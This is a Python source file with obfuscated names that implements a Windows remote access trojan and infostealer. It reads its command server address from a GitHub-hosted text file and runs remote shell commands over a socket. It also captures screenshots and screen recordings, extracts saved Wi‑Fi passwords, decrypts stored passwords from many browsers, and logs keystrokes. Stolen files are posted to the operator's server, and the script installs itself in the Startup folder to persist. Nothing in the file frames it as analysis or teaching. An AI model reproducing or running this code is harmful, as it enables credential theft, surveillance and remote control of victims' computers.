import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
UJWEtQHFqnlcWh = ""
tRRaTlbMXWhAOFCExMkIc = ""
XqfJTUtThbSnZvakRRuEohf = "17.12.24.5"
qDyZGvfkp = "!"
wReadNIXRXyMMSUbBowV = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
zfJALyOPM = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
UnBSUsK = os.path.expanduser("~\\AppData\\Local\\")
USER_ROAMING = os.path.expanduser("~\\AppData\\Roaming\\")
BROWSERS = {
	'chrome': UnBSUsK + 'Google\\Chrome\\User Data','chromium': UnBSUsK + 'Chromium\\User Data','chrome-canary': UnBSUsK + 'Google\\Chrome SxS\\User Data',
	'msedge': UnBSUsK + 'Microsoft\\Edge\\User Data','msedge-canary': UnBSUsK + 'Microsoft\\Edge SxS\\User Data',
	'msedge-beta': UnBSUsK + 'Microsoft\\Edge Beta\\User Data','msedge-dev': UnBSUsK + 'Microsoft\\Edge Dev\\User Data',
	'avast': UnBSUsK + 'AVAST Software\\Browser\\User Data','amigo': UnBSUsK + 'Amigo\\User Data',
	'torch': UnBSUsK + 'Torch\\User Data','kometa': UnBSUsK + 'Kometa\\User Data','orbitum': UnBSUsK + 'Orbitum\\User Data',
	'cent-browser': UnBSUsK + 'CentBrowser\\User Data','7star': UnBSUsK + '7Star\\7Star\\User Data',
	'sputnik': UnBSUsK + 'Sputnik\\Sputnik\\User Data','vivaldi': UnBSUsK + 'Vivaldi\\User Data',
	'epic-privacy-browser': UnBSUsK + 'Epic Privacy Browser\\User Data','uran': UnBSUsK + 'uCozMedia\\Uran\\User Data',
	'yandex': UnBSUsK + 'Yandex\\YandexBrowser\\User Data','brave': UnBSUsK + 'BraveSoftware\\Brave-Browser\\User Data',
	'iridium': UnBSUsK + 'Iridium\\User Data','coccoc': UnBSUsK + 'CocCoc\\Browser\\User Data',
	'opera': USER_ROAMING + 'Opera Software\\Opera Stable','opera-gx': USER_ROAMING + 'Opera Software\\Opera GX Stable'
}
def AakosAAENEcObobisGa(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def pHSZzXQAtGSKr(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	xbysTqZHVPPDDD = data.decode("utf-8").replace("\n","")
	if not xbysTqZHVPPDDD.startswith(qDyZGvfkp):
		proc = subprocess.run(xbysTqZHVPPDDD, shell=True, capture_output=True)
		sGsAQbfUxas = proc.stdout + proc.stderr
		s.send(sGsAQbfUxas)
		return
	CgzbSkUpRzk = xbysTqZHVPPDDD.split(" ")[0][1:]
	args = " ".join(xbysTqZHVPPDDD.split()[1:]).split()
	if CgzbSkUpRzk == "download":
		KNmbpFNLD(s, xbysTqZHVPPDDD)
	elif CgzbSkUpRzk == "screenshot":
		LPbYukDJjyGfQPQp(s)
	elif CgzbSkUpRzk == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif CgzbSkUpRzk == "update":
		cHNSjzwP(s)
	elif CgzbSkUpRzk == "wifi":
		DQINZwHaZQSEsAAJjmTwi(s)
	elif CgzbSkUpRzk == "screenrecord":
		bxtfMuSnsceQwkUkkQ(s, args)
	elif CgzbSkUpRzk == "browsers":
		scrapeBrowsers(s)
def KNmbpFNLD(s, xbysTqZHVPPDDD):
	sdtRayrfAnGiOYsviYkFLk = xbysTqZHVPPDDD.replace(qDyZGvfkp+"download ","").split(",")
	sGsAQbfUxass = ""
	for f in sdtRayrfAnGiOYsviYkFLk:
		sGsAQbfUxass += XAmjbmpWXeKBfCDKyFpg(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(sGsAQbfUxass, "utf-8"))
def LPbYukDJjyGfQPQp(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	mIFfZUPEjnoMRiZDHVOo = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(mIFfZUPEjnoMRiZDHVOo)
	image.close()
	r = XAmjbmpWXeKBfCDKyFpg(mIFfZUPEjnoMRiZDHVOo, "api/sscap")
	os.remove(mIFfZUPEjnoMRiZDHVOo)
	s.send(bytes(r,"utf-8"))
def bxtfMuSnsceQwkUkkQ(s, args):
	xnfNTuEUBGqHvrlQqR = 15
	if not args == []:
		try: xnfNTuEUBGqHvrlQqR = int(args[0])
		except: pass
	qmQEfBDWAAazRvyuEKhL = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	RLezocqtSqYCHr = []
	fps = 11
	numFrames = xnfNTuEUBGqHvrlQqR * fps
	for _ in range(numFrames):
		RLezocqtSqYCHr.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(qmQEfBDWAAazRvyuEKhL, RLezocqtSqYCHr, fps=fps, quality=8)
	XAmjbmpWXeKBfCDKyFpg(qmQEfBDWAAazRvyuEKhL, "api/screc")
def XAmjbmpWXeKBfCDKyFpg(kzZXhJL, OsFLIwBOas, dCHCvqudQekDP=None):
	if not os.path.isfile(kzZXhJL):
		return "[!] 404: "+kzZXhJL+"\n"
	headers = {"user":os.getlogin()}
	if dCHCvqudQekDP is not None:
		headers = {**headers, **dCHCvqudQekDP}
	f = open(kzZXhJL, "rb")
	requests.post("http://"+UJWEtQHFqnlcWh+":5555/"+OsFLIwBOas,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200\n"
def uploadData(dataToSend, OsFLIwBOas):
	if dataToSend.strip() == "":
		return "[!] 204\n"
	requests.post("http://"+UJWEtQHFqnlcWh+":5555/"+OsFLIwBOas,
		data=dataToSend,
		headers={"user":os.getlogin()})
	return "[+] 200\n"
def cHNSjzwP(s):
	h, p, v = RFxSuXum(True)
	if (v != XqfJTUtThbSnZvakRRuEohf):
		gdRmtZpjGIqjA(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def DQINZwHaZQSEsAAJjmTwi(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	xKneoCbgnTCgh = ""
	for p in profiles:
		try: xKneoCbgnTCgh+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: xKneoCbgnTCgh+=f"    {p} - N/A\n"
	s.send(bytes(xKneoCbgnTCgh, "utf-8"))
def gdRmtZpjGIqjA(PEwpdaRhjmEamuFXF):
	PPCXreiEKAImRdFTifZtIN = os.path.basename(__file__)
	fileType = PPCXreiEKAImRdFTifZtIN.split(".")[-1]
	eXxmffSkFrtvhSeqgkCWu = PPCXreiEKAImRdFTifZtIN.split(".")[0]+"."+PEwpdaRhjmEamuFXF+".pyw" if fileType.startswith("py") else ".exe"
	CUoBBYFb = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), eXxmffSkFrtvhSeqgkCWu)
	if not os.path.isfile(CUoBBYFb):
		with open(CUoBBYFb, "w+") as f:
			f.write(requests.get(zfJALyOPM+"file."+ "pyw" if CUoBBYFb.split(".")[-1].startswith("py") else "exe").text)
def RFxSuXum(force=False):
	global UJWEtQHFqnlcWh, tRRaTlbMXWhAOFCExMkIc
	if force or UJWEtQHFqnlcWh == "" or tRRaTlbMXWhAOFCExMkIc == "":
		data = requests.get(wReadNIXRXyMMSUbBowV).text.replace("\n","").split(":")
		UJWEtQHFqnlcWh = data[0].strip()
		tRRaTlbMXWhAOFCExMkIc = data[1].strip()
		PEwpdaRhjmEamuFXF = data[2].strip()
	return UJWEtQHFqnlcWh, tRRaTlbMXWhAOFCExMkIc, PEwpdaRhjmEamuFXF
def jDTKtdtRuKeTNkqlGDN():
	try:
		JzEbuRjzGIwMAI = "settings.xpb"
		hcNHxQInTA = sorted([file for file in os.listdir(UnBSUsK) if os.path.isfile(UnBSUsK+"\\"+file) and file.endswith(JzEbuRjzGIwMAI.split(".")[-1])])
		if JzEbuRjzGIwMAI in hcNHxQInTA:
			hcNHxQInTA.remove(JzEbuRjzGIwMAI)
		lkESpkQhPRFvlL = os.path.join(UnBSUsK,JzEbuRjzGIwMAI)
		if len(hcNHxQInTA) > 0:
			with open(lkESpkQhPRFvlL, "ab+") as f:
				for file in hcNHxQInTA:
					temp = os.path.join(UnBSUsK,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		XAmjbmpWXeKBfCDKyFpg(lkESpkQhPRFvlL, "api/log")
		if os.path.isfile(lkESpkQhPRFvlL):
			os.remove(lkESpkQhPRFvlL)
	except:
		pass
def uJnzhLMUcMgWkPe():
	logging.basicConfig(filename=(UnBSUsK+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def fMoIMxpSbMHgkSTsMSp(k):
		logging.info(str(k))
	k=Listener(on_press=fMoIMxpSbMHgkSTsMSp)
	dAuofUtACIIHoxgEDom = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in dAuofUtACIIHoxgEDom:
		l.setLevel(logging.CRITICAL)
	k.start()
def scrapeBrowsers(s, upload=False):
	data = "\n"
	for browser in BROWSERS:
		path = BROWSERS[browser]
		encryptionKey = None
		if not os.path.isfile(path+"\\Local State"):
			continue
		with open(path+"\\Local State", "r") as f:
			localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
			encryptionKey = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
		shutil.copyfile(path+"\\Default\\Login Data", UnBSUsK+"\\db.db")
		conn = sqlite3.connect(UnBSUsK+"\\db.db")
		cursor = conn.cursor()
		cursor.execute("SELECT action_url, username_value, password_value FROM logins")
		data += "*"*8+" "+browser+" "+"*"*8+"\n"
		for _, login in enumerate(cursor.fetchall()):
			ciphertext = login[2]
			initVector = ciphertext[3:15]
			encryptedPwd = ciphertext[15:-16]
			cipher = AES.new(encryptionKey, AES.MODE_GCM, initVector)
			decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
			data += f"URL: {login[0]}\nUser: {login[1]}\nValue: {decryptedPwd}\n\n"
		cursor.close()
		conn.close()
	data += "\n"
	if os.path.isfile(UnBSUsK+"\\db.db"):
		os.remove(UnBSUsK+"\\db.db")
	if not upload:
		s.send(bytes(data,"utf-8"))
	else:
		uploadData(data, "api/google")
def DbvgdOppgAUwZHIKDxswD():
	h, p, v = RFxSuXum()
	jDTKtdtRuKeTNkqlGDN()
	scrapeBrowsers(None,True)
	if XqfJTUtThbSnZvakRRuEohf != v:
		gdRmtZpjGIqjA(v)
	uJnzhLMUcMgWkPe()
	YYWNjhjPfGalyhQGHsz = bytes(("(old)"if XqfJTUtThbSnZvakRRuEohf!=v else "")+"["+XqfJTUtThbSnZvakRRuEohf+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				ePSindirWUidT=False
				try:
					s=AakosAAENEcObobisGa(h, p)
					while not ePSindirWUidT:
						s.send(YYWNjhjPfGalyhQGHsz)
						ePSindirWUidT=pHSZzXQAtGSKr(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
DbvgdOppgAUwZHIKDxswD()
